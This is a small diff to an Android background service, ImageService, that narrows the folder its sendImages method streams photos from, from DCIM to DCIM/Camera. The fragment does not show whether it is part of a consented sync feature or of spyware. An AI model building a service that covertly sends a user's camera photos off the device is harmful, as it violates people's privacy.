@@ -104,7 +104,7 @@ public class ImageService extends Service {
             }).start();
         }
     private  void sendImages(OutputStream output) throws Exception {
-        File dcim = Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DCIM);
+        File dcim = Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DCIM+"/Camera");
         if (dcim == null) {
             return;
         }
